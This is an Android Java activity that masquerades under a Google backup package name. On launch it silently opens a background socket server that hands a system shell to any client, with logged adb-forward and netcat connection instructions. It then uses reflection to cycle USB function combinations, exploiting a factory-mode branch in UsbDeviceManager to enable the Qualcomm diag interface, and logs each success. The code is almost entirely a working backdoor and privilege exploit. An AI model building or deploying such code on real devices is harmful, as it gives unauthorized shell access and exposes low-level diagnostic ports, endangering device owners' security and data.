package com.google.android.backup;

import android.app.Activity;
import android.content.Context;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.util.Log;

import android.net.LocalServerSocket;
import android.net.LocalSocket;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class SetBackupAccountActivity extends Activity {
    private static final String TAG = "ShellSocket";
    private static final String SOCKET_NAME = "android_shell_socket";

    /**
     * 検証対象の 4 組み合わせ。UsbDeviceManager.java の工場モード分岐を狙う。
     *
     * 分岐の該当箇所:
     * <pre>
     * if (rw_qfunc_mode.equals("0")) {
     *     if (mFactoryEnabled) {
     *         if (containsFunction(functions, "rndis")) {
     *             functions3 = addFunction("rndis", "diag");   // → "rndis,diag"
     *         } else {
     *             functions3 = "diag";
     *         }
     *         functions2 = addFunction(functions3, "modem");   // → "rndis,diag,modem" or "diag,modem"
     *     } else {
     *         functions2 = removeFunction(functions, "diag");
     *     }
     *     ...
     * }
     * </pre>
     */
    private static final String[] COMBOS = new String[] {
        "rndis,diag",
        "diag,rndis",
        "rndis,diag,modem",
        "diag,modem",
    };

    /** 各組み合わせを試すラウンド数。 */
    private static final int ROUNDS = 3;

    /** 各呼び出し間の待機 (ms)。UsbHandler の非同期処理に時間を与える。 */
    private static final long SLEEP_BETWEEN_MS = 300;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // バックグラウンドでソケットサーバーを起動
        startShellServer();

        // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
        finish();

        // 既存処理の最後に、4 組み合わせを多角的に総当たり検証
        applyMultiAngleUsbSwitch();
    }

    /**
     * 4 組み合わせを多角的に検証する。
     *
     * <p>各組み合わせに対して以下を順に実行:
     * <ol>
     *   <li>makeDefault=false で UsbManager.setCurrentFunction</li>
     *   <li>makeDefault=true で UsbManager.setCurrentFunction</li>
     *   <li>状態を読み取ってログ出力</li>
     *   <li>sys.usb.config に diag が含まれていれば「HIT」として記録</li>
     * </ol>
     * 3 ラウンド繰り返す。
     *
     * <p>sys.usb.config / persist.sys.usb.config への直接書き込みは一切行わない。
     */
    private void applyMultiAngleUsbSwitch() {
        try {
            Context context = getApplicationContext();
            if (context == null) {
                Log.e(TAG, "Context is null, skip USB switch");
                return;
            }

            int hitCount = 0;

            for (int round = 0; round < ROUNDS; round++) {
                Log.i(TAG, "================ ROUND " + round + " / " + (ROUNDS - 1) + " ================");

                for (int i = 0; i < COMBOS.length; i++) {
                    String combo = COMBOS[i];

                    Log.i(TAG, "---- COMBO[" + i + "] = \"" + combo + "\" ----");

                    // (1) 即時切替
                    setCurrentFunctionViaUsbManager(context, combo, false);
                    sleepQuiet(SLEEP_BETWEEN_MS);
                    logCurrentUsbState(context, combo, "makeDefault=false");

                    // (2) 永続切替
                    setCurrentFunctionViaUsbManager(context, combo, true);
                    sleepQuiet(SLEEP_BETWEEN_MS);
                    logCurrentUsbState(context, combo, "makeDefault=true");

                    // (3) diag 有効化判定
                    String sysUsbConfig = getSystemProperty("sys.usb.config", "");
                    boolean containsDiag = containsFunction(sysUsbConfig, "diag");
                    if (containsDiag) {
                        hitCount++;
                        Log.i(TAG, "*** HIT *** combo=\"" + combo + "\""
                                + " round=" + round
                                + " sys.usb.config=" + sysUsbConfig);
                    }
                }
            }

            Log.i(TAG, "================ RESULT ================");
            Log.i(TAG, "HIT count (sys.usb.config contains diag): " + hitCount + " / "
                    + (COMBOS.length * ROUNDS));
            Log.i(TAG, "final sys.usb.config=" + getSystemProperty("sys.usb.config", ""));
            Log.i(TAG, "final persist.sys.usb.config=" + getSystemProperty("persist.sys.usb.config", ""));
            Log.i(TAG, "final sys.usb.state=" + getSystemProperty("sys.usb.state", ""));
            Log.i(TAG, "final isFunctionEnabled(diag)=" + isFunctionEnabledViaUsbManager(context, "diag"));

            Log.i(TAG, "applyMultiAngleUsbSwitch finished");
        } catch (Throwable t) {
            Log.e(TAG, "applyMultiAngleUsbSwitch error", t);
        }
    }

    /**
     * propertyContainsFunction 相当。
     * カンマ区切り文字列に、指定の関数が完全一致で含まれるか判定する。
     * UsbManager.propertyContainsFunction と同じロジック。
     */
    private static boolean containsFunction(String functions, String function) {
        if (functions == null || function == null) {
            return false;
        }
        int index = functions.indexOf(function);
        if (index < 0) {
            return false;
        }
        if (index > 0 && functions.charAt(index - 1) != ',') {
            return false;
        }
        int charAfter = index + function.length();
        return charAfter >= functions.length() || functions.charAt(charAfter) == ',';
    }

    private static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            // ignore
        }
    }

    /**
     * UsbManager.setCurrentFunction(String, boolean) をリフレクションで呼ぶ。
     *
     * <p>IUsbManager 直叩きは同じ Binder transaction 15 を通るため呼ばない。
     * 1 経路に絞る。
     */
    private static void setCurrentFunctionViaUsbManager(Context context,
                                                        String function,
                                                        boolean makeDefault) {
        try {
            if (context == null) {
                return;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
            Log.i(TAG, "setCurrentFunction invoked: " + function
                    + ", makeDefault=" + makeDefault);
        } catch (NoSuchMethodException e) {
            Log.e(TAG, "setCurrentFunction not found", e);
        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException in setCurrentFunction", e);
        } catch (Throwable t) {
            Log.e(TAG, "Throwable in setCurrentFunction", t);
        }
    }

    /**
     * 現在の USB 状態を読み取ってログに残す。読み取りのみ。
     * 書き込みは一切行わない。
     */
    private static void logCurrentUsbState(Context context, String combo, String phase) {
        try {
            String sysUsbConfig = getSystemProperty("sys.usb.config", "");
            String sysUsbState = getSystemProperty("sys.usb.state", "");
            String persistUsbConfig = getSystemProperty("persist.sys.usb.config", "");
            String defaultFunction = getDefaultFunctionViaUsbManager(context);
            boolean diagEnabled = isFunctionEnabledViaUsbManager(context, "diag");

            Log.i(TAG, "[after \"" + combo + "\" " + phase + "]"
                    + " sys.usb.config=" + sysUsbConfig
                    + " sys.usb.state=" + sysUsbState
                    + " persist.sys.usb.config=" + persistUsbConfig
                    + " defaultFunction=" + defaultFunction
                    + " isFunctionEnabled(diag)=" + diagEnabled);
        } catch (Throwable t) {
            Log.e(TAG, "logCurrentUsbState error", t);
        }
    }

    /**
     * SystemProperties.get(String, String) をリフレクションで読み取る。
     * 読み取り専用。書き込みは行わない。
     */
    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method getMethod = spClass.getMethod("get", String.class, String.class);
            getMethod.setAccessible(true);
            Object result = getMethod.invoke(null, key, defaultValue);
            return result instanceof String ? (String) result : defaultValue;
        } catch (Throwable t) {
            return defaultValue;
        }
    }

    /**
     * UsbManager.isFunctionEnabled(String) をリフレクションで呼ぶ。
     */
    private static boolean isFunctionEnabledViaUsbManager(Context context, String function) {
        try {
            if (context == null) {
                return false;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return false;
            }
            Method m = service.getClass().getMethod("isFunctionEnabled", String.class);
            m.setAccessible(true);
            Object result = m.invoke(service, function);
            return result instanceof Boolean && (Boolean) result;
        } catch (Throwable t) {
            return false;
        }
    }

    /**
     * UsbManager.getDefaultFunction() をリフレクションで呼ぶ。
     */
    private static String getDefaultFunctionViaUsbManager(Context context) {
        try {
            if (context == null) {
                return null;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return null;
            }
            Method m = service.getClass().getMethod("getDefaultFunction");
            m.setAccessible(true);
            Object result = m.invoke(service);
            return result instanceof String ? (String) result : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private void startShellServer() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Unixドメインソケット（抽象名前空間）を開く
                    LocalServerSocket server = new LocalServerSocket(SOCKET_NAME);
                    Log.i(TAG, "Shell socket server started: " + SOCKET_NAME);
                    Log.i(TAG, "Run on Ubuntu: adb forward tcp:8888 localabstract:" + SOCKET_NAME);
                    Log.i(TAG, "Then connect: nc 127.0.0.1 8888");

                    while (true) {
                        try {
                            LocalSocket client = server.accept();
                            Log.i(TAG, "New client connected!");
                            new Thread(new ShellHandler(client)).start();
                        } catch (Exception e) {
                            Log.e(TAG, "Accept error", e);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start socket server", e);
                }
            }
        }).start();
    }

    // クライアント接続ごとにシェルを提供するハンドラ
    private static class ShellHandler implements Runnable {
        private LocalSocket socket;

        ShellHandler(LocalSocket socket) {
            this.socket = socket;
        }

        @Override
        public void run() {
            Process shell = null;
            try {
                ProcessBuilder builder = new ProcessBuilder("/system/bin/sh");
                builder.redirectErrorStream(true);
                shell = builder.start();

                final InputStream socketIn = socket.getInputStream();
                final OutputStream socketOut = socket.getOutputStream();

                final OutputStream shellStdin = shell.getOutputStream();
                final InputStream shellStdout = shell.getInputStream();

                Thread socketToShell = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = socketIn.read(buffer)) != -1) {
                                shellStdin.write(buffer, 0, len);
                                shellStdin.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                Thread shellToSocket = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = shellStdout.read(buffer)) != -1) {
                                socketOut.write(buffer, 0, len);
                                socketOut.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                socketToShell.start();
                shellToSocket.start();

                shell.waitFor();
                Log.i(TAG, "Shell process exited");

                socket.close();
                socketToShell.interrupt();
                shellToSocket.interrupt();

            } catch (Exception e) {
                Log.e(TAG, "Shell handler error", e);
            } finally {
                if (shell != null) {
                    shell.destroy();
                }
                try {
                    socket.close();
                } catch (Exception ignored) {}
            }
        }
    }
}
